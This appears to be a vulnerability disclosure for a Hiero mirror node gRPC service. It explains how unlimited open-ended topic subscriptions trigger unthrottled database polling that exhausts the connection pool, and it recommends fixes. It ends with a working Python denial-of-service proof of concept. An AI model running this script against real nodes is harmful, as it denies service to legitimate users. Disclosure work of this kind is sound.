### Title
Unthrottled DB Poll Amplification via Unbounded Safety-Check Subscriptions Enables Connection Pool Exhaustion

### Summary
Any unauthenticated gRPC client can open an unlimited number of `subscribeTopic` streams with no `endTime` and no `limit`. After one second, each subscription unconditionally fires a "safety check" that invokes the unthrottled retriever path, which issues up to 13 rapid database queries at 20 ms intervals per subscription. Because there is no cap on concurrent subscriptions and no global DB-connection budget per subscriber, a moderate number of concurrent streams exhausts the HikariCP connection pool and prevents all other gRPC clients from receiving service.

### Finding Description

**Entry point — `ConsensusController.subscribeTopic`**

`ConsensusController.toFilter()` maps the protobuf request directly to a `TopicMessageFilter`. When the client omits `consensusEndTime` and `limit`, both fields are left at their zero/null defaults (`endTime=null`, `limit=0`, `hasLimit()=false`). [1](#0-0) 

There is no per-IP, per-user, or global subscription count enforcement anywhere in `TopicMessageServiceImpl`; `subscriberCount` is a metrics gauge only. [2](#0-1) 

**Safety-check trigger — always fires when `endTime == null`**

`TopicContext.isComplete()` returns `false` whenever `filter.getEndTime() == null`: [3](#0-2) 

The safety check is a `Mono.delay(1s)` that fires once per subscription and calls `missingMessages(topicContext, null)`: [4](#0-3) 

**Unthrottled retriever invoked with user-controlled filter**

`missingMessages` with `current == null` builds `gapFilter` via `toBuilder()`, which copies the original filter's `endTime=null` and `limit=0`, then calls `retrieve(gapFilter, false)` (unthrottled): [5](#0-4) 

**`isComplete()` never returns `true` without a limit**

In unthrottled mode, `isComplete()` only returns `true` when `limitHit` is true. With `hasLimit()=false`, `limitHit` is always `false`, so the predicate `!context.isComplete()` stays `true` for all 12 repeats: [6](#0-5) 

**Poll loop configuration**

`numRepeats = maxPolls = 12`, `frequency = 20 ms`, `maxPageSize = 5000`. The `RepeatSpec` fires 12 additional polls after the initial one = **13 total DB queries per safety-check invocation**, each requesting up to 5 000 rows: [7](#0-6) [8](#0-7) 

Each poll calls `Flux.fromStream(topicMessageRepository.findByFilter(newFilter))`. A Spring Data JPA `Stream<T>` holds a JDBC connection open until the stream is fully consumed or closed. [9](#0-8) 

**Existing mitigation is insufficient**

`maxConcurrentCallsPerConnection = 5` limits calls per TCP connection, not total connections. An attacker opens many TCP connections, each carrying 5 concurrent streams, bypassing this control entirely. [10](#0-9) 

### Impact Explanation
With a default HikariCP pool of 10 connections, an attacker needs only ~1 connection holding 5 streams (5 safety checks × 13 polls = 65 in-flight DB queries within 260 ms) to saturate the pool. All other gRPC subscribers and internal components that share the same pool (importer, REST layer) will block waiting for a connection, causing cascading timeouts and service unavailability. The 60-second retriever timeout means each malicious subscription holds pressure for up to a minute before expiring.

### Likelihood Explanation
The attack requires no credentials, no special knowledge, and no privileged access — only the ability to open gRPC connections to port 5600. The `subscribeTopic` RPC is the public API. The attack is trivially scriptable: open N connections, each with 5 concurrent `subscribeTopic` calls omitting `consensusEndTime` and `limit`, wait 1 second, and observe pool exhaustion. It is repeatable indefinitely because each subscription auto-renews the safety check on reconnect.

### Recommendation
1. **Enforce a limit in unthrottled `isComplete()`**: when no limit is set, treat a page smaller than `maxPageSize` as the completion signal (mirror the throttled logic), preventing all 12 polls from firing on an empty or sparse topic.
2. **Cap concurrent subscriptions globally or per source IP** in `TopicMessageServiceImpl`, rejecting new subscriptions beyond the threshold with `RESOURCE_EXHAUSTED`.
3. **Require `endTime` or `limit` for subscriptions that enter the unthrottled path**, or strip the safety check for open-ended subscriptions that have never received a message.
4. **Use a dedicated, size-limited connection pool** for the unthrottled retriever, isolating its DB pressure from the main pool.

### Proof of Concept
```python
import grpc, threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2
from hederahashgraph.api.proto.java import basic_types_pb2, timestamp_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_SHARD, TOPIC_REALM, TOPIC_NUM = 0, 0, 1234  # any valid topic

def open_subscription():
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(
            shardNum=TOPIC_SHARD, realmNum=TOPIC_REALM, topicNum=TOPIC_NUM),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
        # No consensusEndTime, no limit — triggers the vulnerable path
    )
    try:
        for _ in stub.subscribeTopic(query):
            pass
    except Exception:
        pass

# Open 50 concurrent subscriptions across 10 connections (5 per connection)
threads = [threading.Thread(target=open_subscription) for _ in range(50)]
for t in threads: t.start()
# After ~1 second, 50 safety checks fire simultaneously.
# Each triggers 13 DB polls at 20ms intervals → 650 concurrent DB queries.
# HikariCP pool (default ~10) is exhausted; legitimate clients receive errors.
for t in threads: t.join()
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/controller/ConsensusController.java (L55-73)
```java
    private TopicMessageFilter toFilter(ConsensusTopicQuery query) {
        final var filter = TopicMessageFilter.builder().limit(query.getLimit());

        if (query.hasTopicID()) {
            filter.topicId(EntityId.of(query.getTopicID()));
        }

        if (query.hasConsensusStartTime()) {
            long startTime = convertTimestamp(query.getConsensusStartTime());
            filter.startTime(startTime);
        }

        if (query.hasConsensusEndTime()) {
            long endTime = convertTimestamp(query.getConsensusEndTime());
            filter.endTime(endTime);
        }

        return filter.build();
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L66-70)
```java
        // Safety Check - Polls missing messages after 1s if we are stuck with no data
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L142-150)
```java
        if (current == null) {
            long startTime = last != null
                    ? last.getConsensusTimestamp() + 1
                    : topicContext.getFilter().getStartTime();
            var gapFilter =
                    topicContext.getFilter().toBuilder().startTime(startTime).build();
            log.info("Safety check triggering gap recovery query with filter {}", gapFilter);
            return topicMessageRetriever.retrieve(gapFilter, false);
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L203-215)
```java
        boolean isComplete() {
            if (filter.getEndTime() == null) {
                return false;
            }

            if (filter.getEndTime() < startTime) {
                return true;
            }

            return Instant.ofEpochSecond(0, filter.getEndTime())
                    .plus(grpcProperties.getEndTimeInterval())
                    .isBefore(Instant.now());
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L51-55)
```java
        return Flux.defer(() -> poll(context))
                .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
                        .jitter(0.1)
                        .withFixedDelay(context.getFrequency())
                        .withScheduler(scheduler))
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L65-79)
```java
    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getTotal().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, context.getMaxPageSize());
        var startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        context.getPageSize().set(0L);

        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        log.debug("Executing query: {}", newFilter);
        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L121-128)
```java
        boolean isComplete() {
            boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();

            if (throttled) {
                return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
            }

            return limitHit;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/RetrieverProperties.java (L36-47)
```java
    public static class UnthrottledProperties {

        @Min(1000)
        private int maxPageSize = 5000;

        @Min(4)
        private long maxPolls = 12;

        @DurationMin(millis = 10)
        @NotNull
        private Duration pollingFrequency = Duration.ofMillis(20);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-15)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```
